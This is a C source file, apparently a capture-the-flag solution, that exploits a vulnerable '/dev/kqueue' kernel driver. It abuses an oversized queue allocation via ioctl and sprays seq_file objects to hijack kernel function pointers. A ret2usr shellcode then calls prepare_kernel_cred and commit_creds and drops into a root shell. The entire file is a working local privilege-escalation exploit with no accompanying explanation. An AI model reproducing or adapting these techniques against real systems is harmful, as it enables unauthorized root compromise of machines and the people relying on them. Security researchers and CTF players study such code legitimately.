#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>

typedef struct
{
    uint32_t    max_entries;
    uint16_t    data_size;
    uint16_t    entry_idx;
    uint16_t    queue_idx;
    char*       data;
}request_t;

long dev_fd;
size_t root_rip;

size_t user_cs, user_ss, user_rflags, user_sp;
void saveStatus(void)
{
    __asm__ volatile ("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}

void getRootShell(void)
{   
    puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");

    if(getuid()) {
        puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
        exit(-1);
    }

    puts("\033[32m\033[1m[+] Successful to get the root."
         "Execve root shell now...\033[0m");
    system("/bin/sh");
    exit(0);
}

void errExit(char * msg)
{
    printf("\033[31m\033[1m[x] Error: \033[0m%s\n", msg);
    exit(EXIT_FAILURE);
}

void createQueue(uint32_t max_entries, uint16_t data_size)
{
    request_t req = {
        .max_entries    = max_entries,
        .data_size      = data_size,
    };
    ioctl(dev_fd, 0xDEADC0DE, &req);
}

void editQueue(uint16_t queue_idx, uint16_t entry_idx, void *data)
{
    request_t req = {
        .queue_idx  = queue_idx,
        .entry_idx  = entry_idx,
        .data       = data,
    };
    ioctl(dev_fd, 0xDAADEEEE, &req);
}

void deleteQueue(uint16_t queue_idx)
{
    request_t req = {
        .queue_idx = queue_idx,
    };
    ioctl(dev_fd, 0xBADDCAFE, &req);
}

void saveQueue(uint16_t queue_idx, uint32_t max_entries, uint16_t data_size)
{
    request_t req = {
        .queue_idx      = queue_idx,
        .max_entries    = max_entries,
        .data_size      = data_size,
    };
    ioctl(dev_fd, 0xB105BABE, &req);
}

void shellcode(void)
{
    __asm__ volatile (
        "mov r12, [rsp + 0x8];"
        "sub r12, 0x201179;"
        "mov r13, r12;"
        "add r12, 0x8c580;"  // prepare_kernel_cred
        "add r13, 0x8c140;"  // commit_creds
        "xor rdi, rdi;"
        "call r12;"
        "mov rdi, rax;"
        "call r13;"
        "swapgs;"
        "mov r14, user_ss;"
        "push r14;"
        "mov r14, user_sp;"
        "push r14;"
        "mov r14, user_rflags;"
        "push r14;"
        "mov r14, user_cs;"
        "push r14;"
        "mov r14, root_rip;"
        "push r14;"
        "iretq;"
    );
}

int main(int argc, char **argv, char**envp)
{
    long        seq_fd[0x200];
    size_t      *page;
    size_t      data[0x20];

    /* prepare */
    saveStatus();
    root_rip = (size_t) getRootShell;

    dev_fd = open("/dev/kqueue", O_RDONLY);
    if (dev_fd < 0) {
        errExit("FAILED to open the dev!");
    }

    for (int i = 0; i < 0x20; i++) {
        data[i] = (size_t) shellcode;
    }

    /* construct evil queue */
    createQueue(0xffffffff, 0x20 * 8);
    editQueue(0, 0, data);

    /* spray seq_file and hijack */
    for (int i = 0; i < 0x200; i++) {
        seq_fd[i] = open("/proc/self/stat", O_RDONLY);
    }
    saveQueue(0, 0, 0x40);

    /* trigger */
    for (int i = 0; i < 0x200; i++) {
        read(seq_fd[i], data, 1);
    }

    return 0;
}